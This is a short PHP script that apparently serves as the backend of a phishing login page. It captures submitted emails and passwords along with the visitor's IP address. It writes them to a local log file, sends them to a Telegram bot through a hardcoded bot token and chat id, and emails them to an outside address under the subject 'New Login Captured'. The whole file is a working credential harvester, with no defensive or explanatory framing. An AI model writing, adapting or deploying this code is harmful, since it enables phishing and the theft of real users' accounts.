<?php
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';

if ($email && $password) {
    $data = "Email: $email\nPassword: $password\nIP: " . $_SERVER['REMOTE_ADDR'] . "\n\n";

    // Save to file (in same directory)
    file_put_contents("log.txt", $data, FILE_APPEND);

    // Telegram Send
    $token = "8193103085:AAFFGS-tncgQsxBlqsziW-8k9Y0pGJp-l8A";
    $chat_id = "5265985001";
    $message = urlencode("Login Attempt:\n$data");
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$message");

    // Send to peggypeedy@gail.com
    $subject = "New Login Captured";
    $headers = "From: login-capture@yourdomain.com";
    mail("peggypeedy@gail.com", $subject, $data, $headers);
}
?>
